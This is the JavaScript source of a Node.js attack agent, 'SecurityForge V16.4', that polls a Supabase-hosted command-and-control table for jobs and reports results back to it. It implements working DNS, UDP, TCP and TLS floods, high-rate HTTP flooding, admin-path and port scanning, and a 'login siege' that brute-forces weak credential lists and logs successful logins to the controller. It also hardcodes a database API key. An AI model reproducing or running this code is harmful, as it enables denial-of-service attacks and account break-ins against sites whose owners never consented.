/**
 * SECURITYFORGE AGENT V16.4 (ZERO TRUST)
 * - V16.4: Zero Trust Logic. 200 OK is FAILURE for logins unless proven otherwise.
 * - V16.3: Fixed Login False Positives (HTML Body Analysis + Error Keyword Detection)
 * - V16.1: Local IP Detection
 * - V16.0: Master Key Logic
 */
const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const dgram = require('dgram');
const zlib = require('zlib');
const tls = require('tls');
const dns = require('dns');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// --- ASSETS ---
const PROXY_LIST = [
    '104.16.148.244:80', '188.166.204.43:8080', '45.167.124.5:999', '103.152.112.162:80',
    '117.251.103.186:8080', '43.205.118.158:80', '167.172.109.12:3128', '20.210.113.32:8123'
];
const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/backup.sql', '/api/v1/users', '/root', '/panel', '/phpinfo.php'];
const WEAK_CREDS = [
    ['admin', 'admin'], ['admin', '123456'], ['root', 'toor'], ['user', 'password'], 
    ['test', 'test'], ['admin', 'password'], ['root', 'root'], ['administrator', '12345678'],
    ['admin1', 'password'], ['admin', '12345'], ['guest', 'guest'], ['service', 'service'],
    ['operator', 'operator'], ['manager', 'manager'], ['support', 'support'], ['sysadmin', 'sysadmin']
];
const COMMON_PASSWORDS = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', 'master', 'mysql', 'root123'];
const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  
const ERROR_KEYWORDS = ['invalid', 'incorrect', 'fail', 'error', 'denied', 'wrong', 'try again', 'unauthorized', 'not found', 'login failed'];
const SUCCESS_KEYWORDS = ['welcome', 'dashboard', 'success', 'account', 'profile', 'logged in', 'session'];

// --- KEEPALIVE SERVER ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V16.4 ACTIVE'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: NATIVE SUPABASE ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => { 
                    if (res.statusCode >= 400) {
                        resolve(null);
                    } else {
                        try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
                    }
                });
            });
            req.on('error', (e) => reject(e));
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[35m[AGENT] Initialized V16.4 (Zero Trust). Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;
let logBuffer = []; // Store logs to send to C2

// --- DYNAMIC SCALING (AUTO-MEM) ---
const MAX_RAM_BYTES = 400 * 1024 * 1024; 
const checkMemory = () => {
    const used = process.memoryUsage().heapUsed;
    return used < MAX_RAM_BYTES;
};

const logToC2 = (msg) => {
    console.log(msg);
    // Push critical messages with a special flag
    logBuffer.push(msg.replace(/\x1b\[[0-9;]*m/g, ''));
};

const startAttack = (job) => {
    if (activeJob) return;
    activeJob = job;
    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
    logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
    if(job.use_port_scan) logToC2(`[RECON] Starting Port Scan on ${job.target}...`);
    
    let running = true;
    let totalRequests = 0;
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    let jobMaxLatency = 0;
    let consecutiveFailures = 0; // V16.1
    
    // --- MODULE: SHADOW OPS & RECON ---
    if (job.use_dns_reaper) {
        const [host, portStr] = job.target.split(':');
        const port = 53;
        const flood = () => {
             if (!running) return;
             if (!checkMemory()) return setTimeout(flood, 100);
             try {
                const client = dgram.createSocket('udp4');
                const buf = Buffer.from('aa00010000010000000000000377777706676f6f676c6503636f6d0000010001', 'hex'); 
                client.send(buf, port, host, (err) => { client.close(); totalRequests++; });
             } catch(e) {}
             if (running) setImmediate(flood);
        };
        for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
    }
    else if (job.use_admin_hunter) {
        let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
        const scan = (pathIndex) => {
            if (!running) return;
            const path = ADMIN_PATHS[pathIndex % ADMIN_PATHS.length];
            const opts = { hostname: targetUrl.hostname, path: path, method: 'GET', timeout: 3000 };
            const req = https.request(opts, (res) => {
                if (res.statusCode === 200) logToC2(`[VULN] Found Publicly Accessible: ${targetUrl.protocol}//${targetUrl.hostname}${path}`);
                else if (res.statusCode === 403) logToC2(`[WARN] Found Protected: ${path} (403)`);
                totalRequests++;
                if (running) setImmediate(() => scan(pathIndex + 1));
            });
            req.on('error', () => { if(running) setImmediate(() => scan(pathIndex + 1)); });
            req.end();
        };
        for(let i=0; i<20; i++) scan(i);
    }
    else if (job.use_port_scan) {
        let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
        const scanPort = (idx) => {
            if (!running) return;
            const port = TOP_PORTS[idx % TOP_PORTS.length];
            const socket = new net.Socket();
            socket.setTimeout(2000);
            socket.on('connect', () => {
                logToC2(`[OPEN] Port ${port} is OPEN on ${targetHost}`);
                jobSuccess++; totalRequests++; socket.destroy(); consecutiveFailures = 0;
            });
            socket.on('timeout', () => { 
                socket.destroy(); totalRequests++; consecutiveFailures++;
                if (consecutiveFailures === 10) logToC2(`[ERROR] Target Unreachable. Are you scanning a Local IP from Cloud?`);
            });
            socket.on('error', () => { 
                totalRequests++; consecutiveFailures++; 
                if (consecutiveFailures === 10) logToC2(`[ERROR] Target Connection Failed. Check Firewall.`);
            });
            socket.connect(port, targetHost);
            if (running) setTimeout(() => scanPort(idx + 1), 100); // Slower for logging accuracy
        }
        for(let i=0; i<10; i++) scanPort(i); // Fewer threads for accuracy
    }
    else if (job.use_ssl_storm) {
        let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
        const host = targetUrl.hostname;
        const storm = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(storm, 100);
            try {
                const socket = tls.connect(443, host, { rejectUnauthorized: false }, () => {
                     socket.destroy();
                     jobSuccess++; totalRequests++;
                });
                socket.on('error', () => { jobFailed++; totalRequests++; });
            } catch(e) {}
            if (running) setImmediate(storm);
        };
        for(let i=0; i<Math.min(job.concurrency, 400); i++) storm();
    }
    else if (job.method === 'UDP' || job.method === 'TCP') {
        const [host, portStr] = job.target.split(':');
        const port = parseInt(portStr) || 80;
        const flood = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(flood, 100); 
            try {
                if (job.method === 'UDP') {
                    const client = dgram.createSocket('udp4');
                    client.send(JUNK_DATA_SMALL, port, host, (err) => {
                        client.close();
                        if (!err) jobSuccess++; else jobFailed++;
                        totalRequests++;
                    });
                } else {
                    const client = new net.Socket();
                    client.connect(port, host, () => { client.write(JUNK_DATA_SMALL); client.destroy(); jobSuccess++; totalRequests++; });
                    client.on('error', () => { jobFailed++; totalRequests++; });
                }
            } catch(e) {}
            if (running) setImmediate(flood);
        };
        for(let i=0; i<Math.min(job.concurrency, 500); i++) flood(); 
    } 
    else {
        // --- STRESS / LOGIN MODULE ---
        let targetUrl;
        try { targetUrl = new URL(job.target); } catch(e) { return; }
        const agent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });

        const performRequest = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(performRequest, 100); 

            const lib = targetUrl.protocol === 'https:' ? https : http;
            const start = Date.now();
            let body = job.body;
            let method = job.method || 'GET';
            let creds = null;

            if (job.use_login_siege) {
                method = 'POST';
                // MASTER KEY LOGIC (V16.0)
                if (job.login_type === 'PASS_ONLY') {
                    const pass = COMMON_PASSWORDS[Math.floor(Math.random() * COMMON_PASSWORDS.length)];
                    creds = ['(PIN)', pass];
                    body = JSON.stringify({ password: pass });
                } else if (job.login_type === 'MODAL_API') {
                    const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
                    creds = pair;
                    body = JSON.stringify({ email: pair[0], password: pair[1] });
                } else {
                    // Default USER_PASS
                    const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
                    creds = pair;
                    body = JSON.stringify({ username: pair[0], password: pair[1] });
                }
            }

            const req = lib.request(targetUrl, { agent, method, headers: {'User-Agent': 'SecurityForge/16', 'Content-Type': 'application/json'} }, (res) => {
                 const lat = Date.now() - start;
                 jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
                 
                 // V16.4 FIX: ZERO TRUST LOGIN VERIFICATION
                 if (job.use_login_siege) {
                     let responseBody = '';
                     res.on('data', chunk => responseBody += chunk.toString());
                     res.on('end', () => {
                         const bodyLower = responseBody.toLowerCase();
                         
                         const hasError = ERROR_KEYWORDS.some(kw => bodyLower.includes(kw));
                         const hasSuccessKeyword = SUCCESS_KEYWORDS.some(kw => bodyLower.includes(kw));
                         const hasCookie = res.headers['set-cookie'] && res.headers['set-cookie'].some(c => !c.includes('deleted'));
                         const isRedirect = (res.statusCode === 301 || res.statusCode === 302);
                         const isLoginRedirect = res.headers.location?.includes('login') || res.headers.location?.includes('error');

                         // ZERO TRUST: 200 OK is FAILURE unless explicit success keyword present
                         // Redirect is FAILURE if it goes back to login
                         
                         let isBypass = false;

                         if (isRedirect && !isLoginRedirect) {
                             isBypass = true; // Redirected to dashboard/home
                         } else if (res.statusCode === 200) {
                             if (!hasError && (hasSuccessKeyword || hasCookie)) {
                                 isBypass = true; // 200 OK + "Welcome" or Cookie
                             }
                         }

                         if (isBypass) {
                             logToC2(`[CRITICAL] LOGIN BYPASSED: [${creds[0]} / ${creds[1]}] Status: ${res.statusCode}`);
                             jobSuccess++;
                         } else {
                             jobFailed++; // Default to failed
                         }
                     });
                 } else {
                     if (res.statusCode < 500) jobSuccess++; else jobFailed++;
                     res.resume(); // Standard stress test -> drop body
                 }

                 totalRequests++;
                 if(running) setImmediate(performRequest);
            });
            if (body) req.write(body);
            req.on('error', () => { jobFailed++; totalRequests++; if(running) setImmediate(performRequest); });
            req.end();
        };

        const spawnLoop = setInterval(() => {
             if (!running) return clearInterval(spawnLoop);
             if (checkMemory() && (totalRequests / ((Date.now() - startTime)/1000) < job.concurrency)) {
                 performRequest();
             }
        }, 50);
        for(let i=0; i<100; i++) performRequest();
    }

    // Reporting Loop
    const startTime = Date.now();
    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        
        let statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
        
        // Append logs if any - V16.0 FIX: Flush AFTER send
        const currentLogs = [...logBuffer]; 
        if (currentLogs.length > 0) {
            statsPayload.logs = currentLogs.join('\n');
        }

        try { 
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); 
            // Only clear buffer if request succeeded (prevent log loss)
            if (currentLogs.length > 0) logBuffer = [];
        } catch(e) {}

        if (duration > 0 && elapsed >= duration) {
            running = false;
            clearInterval(activeLoop);
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED' });
        }
    }, 2000);
};

setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=in.(PENDING,RUNNING)&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            if (job.status === 'PENDING') await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { }
}, 3000);
